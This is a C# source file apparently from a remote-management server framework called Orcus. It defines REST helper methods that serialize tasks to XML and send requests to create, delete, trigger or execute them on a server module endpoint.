using System;
using System.IO;
using System.Net.Http;
using System.Threading.Tasks;
using Orcus.Server.Connection.Utilities;
using Orcus.Server.Library.Clients;
using Orcus.Server.Library.Clients.Helpers;
using Tasks.Infrastructure.Core;
using Tasks.Infrastructure.Core.Dtos;
using Tasks.Infrastructure.Server.Library;

namespace Tasks.Infrastructure.Server.Rest.V1
{
    public class TasksResource : ModuleResource<TasksResource>
    {
        public TasksResource() : base("Tasks.Infrastructure", "tasks")
        {
        }

        public static async Task CreateOrUpdateTask(OrcusTask orcusTask, ITaskComponentResolver componentResolver, IXmlSerializerCache xmlCache,
            IRestClient restClient)
        {
            using (var taskMemoryStream = new MemoryStream())
            {
                var taskWriter = new OrcusTaskWriter(taskMemoryStream, componentResolver, xmlCache);
                taskWriter.Write(orcusTask, TaskDetails.Client);

                taskMemoryStream.Position = 0;

                var stream = new StreamContent(taskMemoryStream);
                stream.Headers.ContentEncoding.Add("xml");

                await CreateRequest(HttpVerb.Post, null, stream).Execute(restClient);
            }
        }

        public static Task DeleteTask(Guid taskId, IRestClient restClient) => CreateRequest(HttpVerb.Delete, taskId).Execute(restClient);

        public static Task TriggerTask(Guid taskId, SessionKey sessionKey, IRestClient restClient) =>
            CreateRequest(HttpVerb.Get, $"{taskId:N}/trigger").AddQueryParam("sessionKey", sessionKey.Hash).Execute(restClient);

        public static async Task<TaskSessionsInfo> ExecuteTask(OrcusTask orcusTask, ITaskComponentResolver componentResolver,
            IXmlSerializerCache xmlCache, IRestClient restClient)
        {
            using (var taskMemoryStream = new MemoryStream())
            {
                var taskWriter = new OrcusTaskWriter(taskMemoryStream, componentResolver, xmlCache);
                taskWriter.Write(orcusTask, TaskDetails.Client);

                taskMemoryStream.Position = 0;

                var stream = new StreamContent(taskMemoryStream);
                stream.Headers.ContentEncoding.Add("xml");

                return await CreateRequest(HttpVerb.Post, "execute", stream).Execute(restClient).Return<TaskSessionsInfo>();
            }
        }
    }
}